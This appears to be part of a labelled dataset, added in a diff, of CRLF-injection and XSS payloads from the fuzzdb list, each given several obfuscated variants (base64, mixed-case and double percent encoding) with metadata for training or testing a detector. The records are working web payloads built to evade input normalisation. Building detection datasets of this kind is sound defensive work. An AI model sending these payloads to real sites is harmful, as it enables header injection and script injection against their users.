+    "payload_sha256": "ced058455ca9f049d30349cfe7704e9e13a4f59514f8c5a65fbdedfaadcebd63",
+    "original_id": "raw_logi_00030",
+    "original_payload": "%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22",
+    "obfuscated_payload": "JTIyJTNFJTBBJTBBJTNDc2NyaXB0JTNFYWxlcnQoJTIyWFNTJTIyKSUzQy9zY3JpcHQlM0UlM0MlMjI=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 93664931,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00030__obf03",
+    "payload": "%22%3E%0a%0A%3Cscript%3ealert(%22XSS%22)%3C/script%3E%3C%22",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00030",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "ced058455ca9f049d30349cfe7704e9e13a4f59514f8c5a65fbdedfaadcebd63",
+    "original_id": "raw_logi_00030",
+    "original_payload": "%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22",
+    "obfuscated_payload": "%22%3E%0a%0A%3Cscript%3ealert(%22XSS%22)%3C/script%3E%3C%22",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93665940,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00030__obf04",
+    "payload": "JTIyJTNlJTBBJTBhJTNDc2NyaXB0JTNlYWxlcnQoJTIyWFNTJTIyKSUzQy9zY3JpcHQlM2UlM2MlMjI=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00030",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "ced058455ca9f049d30349cfe7704e9e13a4f59514f8c5a65fbdedfaadcebd63",
+    "original_id": "raw_logi_00030",
+    "original_payload": "%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22",
+    "obfuscated_payload": "JTIyJTNlJTBBJTBhJTNDc2NyaXB0JTNlYWxlcnQoJTIyWFNTJTIyKSUzQy9zY3JpcHQlM2UlM2MlMjI=",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "base64_standard"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 93666949,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00031__obf01",
+    "payload": "%250AContent-type%3A%20text%2Fhtml%0A%250Ahttp%3A/%2Fwww.test.com/%253Cscript%253Ealert%28%2522XSS%22%29%3C%2Fscript%253E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00031",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "3f489a1f93fd172cfb3c6460d3df51509d731097ce5f593def07695c30d2b014",
+    "original_id": "raw_logi_00031",
+    "original_payload": "%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "%250AContent-type%3A%20text%2Fhtml%0A%250Ahttp%3A/%2Fwww.test.com/%253Cscript%253Ealert%28%2522XSS%22%29%3C%2Fscript%253E",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93763925,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00031__obf02",
+    "payload": "JTBBQ29udGVudC10eXBlOiUyMHRleHQvaHRtbCUwQSUwQWh0dHA6Ly93d3cudGVzdC5jb20vJTNDc2NyaXB0JTNFYWxlcnQoJTIyWFNTJTIyKSUzQy9zY3JpcHQlM0U=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00031",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "3f489a1f93fd172cfb3c6460d3df51509d731097ce5f593def07695c30d2b014",
+    "original_id": "raw_logi_00031",
+    "original_payload": "%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "JTBBQ29udGVudC10eXBlOiUyMHRleHQvaHRtbCUwQSUwQWh0dHA6Ly93d3cudGVzdC5jb20vJTNDc2NyaXB0JTNFYWxlcnQoJTIyWFNTJTIyKSUzQy9zY3JpcHQlM0U=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 93764934,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00031__obf03",
+    "payload": "%0aContent-type:%20text/html%0a%0Ahttp://www.test.com/%3Cscript%3ealert(%22XSS%22)%3c/script%3e",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00031",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "3f489a1f93fd172cfb3c6460d3df51509d731097ce5f593def07695c30d2b014",
+    "original_id": "raw_logi_00031",
+    "original_payload": "%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "%0aContent-type:%20text/html%0a%0Ahttp://www.test.com/%3Cscript%3ealert(%22XSS%22)%3c/script%3e",
+    "obfuscation_chain": [
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 93765943,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00031__obf04",
+    "payload": "%250aContent-type%3A%2520text%2Fhtml%250A%250Ahttp%3A%2F%2Fwww.test.com%2F%253Cscript%253Ealert%28%2522XSS%2522%29%253C%2Fscript%253E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00031",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "3f489a1f93fd172cfb3c6460d3df51509d731097ce5f593def07695c30d2b014",
+    "original_id": "raw_logi_00031",
+    "original_payload": "%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "%250aContent-type%3A%2520text%2Fhtml%250A%250Ahttp%3A%2F%2Fwww.test.com%2F%253Cscript%253Ealert%28%2522XSS%2522%29%253C%2Fscript%253E",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93766952,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00032__obf01",
+    "payload": "%250d%0a%250d%250a%253Cscript%253Ealert%28%22XSS%22%29%253C%252Fscript%3E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00032",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "729181530f93878232c8cf5fe824e91d356d9462c0e6a24af7ba80db392171f9",
+    "original_id": "raw_logi_00032",
+    "original_payload": "%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E",
+    "obfuscated_payload": "%250d%0a%250d%250a%253Cscript%253Ealert%28%22XSS%22%29%253C%252Fscript%3E",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93863928,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00032__obf02",
+    "payload": "JTBkJTBhJTBkJTBhJTNDc2NyaXB0JTNFYWxlcnQoJTIyWFNTJTIyKSUzQyUyRnNjcmlwdCUzRQ==",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00032",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "729181530f93878232c8cf5fe824e91d356d9462c0e6a24af7ba80db392171f9",
+    "original_id": "raw_logi_00032",
+    "original_payload": "%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E",
+    "obfuscated_payload": "JTBkJTBhJTBkJTBhJTNDc2NyaXB0JTNFYWxlcnQoJTIyWFNTJTIyKSUzQyUyRnNjcmlwdCUzRQ==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 93864937,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00032__obf03",
+    "payload": "\\r\\n%0d%0A%3Cscript%3ealert(%22XSS%22)%3c%2fscript%3E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00032",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "729181530f93878232c8cf5fe824e91d356d9462c0e6a24af7ba80db392171f9",
+    "original_id": "raw_logi_00032",
+    "original_payload": "%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E",
+    "obfuscated_payload": "\\r\\n%0d%0A%3Cscript%3ealert(%22XSS%22)%3c%2fscript%3E",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 93865946,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00032__obf04",
+    "payload": "JTBEJTBhJTBEJTBBJTNDc2NyaXB0JTNlYWxlcnQoJTIyWFNTJTIyKSUzYyUyRnNjcmlwdCUzRQ==",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00032",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "729181530f93878232c8cf5fe824e91d356d9462c0e6a24af7ba80db392171f9",
+    "original_id": "raw_logi_00032",
+    "original_payload": "%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E",
+    "obfuscated_payload": "JTBEJTBhJTBEJTBBJTNDc2NyaXB0JTNlYWxlcnQoJTIyWFNTJTIyKSUzYyUyRnNjcmlwdCUzRQ==",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "base64_standard"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 93866955,
+    "equivalence_scope": "explicit-decoder-required"
+  }
+]
